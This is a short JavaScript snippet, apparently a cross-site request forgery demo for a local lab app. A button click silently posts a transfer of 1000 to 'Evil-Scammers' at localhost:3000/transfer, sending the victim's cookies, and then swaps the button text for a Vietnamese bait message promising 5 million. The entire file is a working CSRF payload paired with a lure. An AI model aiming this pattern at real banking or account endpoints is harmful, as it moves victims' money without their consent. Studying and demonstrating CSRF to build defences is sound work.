const btnForgery = document.getElementById('btn-forgery')

btnForgery.addEventListener('click', function(event) {
  event.preventDefault();

  const body = new URLSearchParams('amount=1000&description=Gotcha!&to=Evil-Scammers');
    fetch('http://localhost:3000/transfer', {
    body,
    credentials: 'include', 
    method: 'post',
    mode: 'no-cors',
    });

    btnForgery.textContent = "Bạn đã nhận được 5 triệu!"
 });
 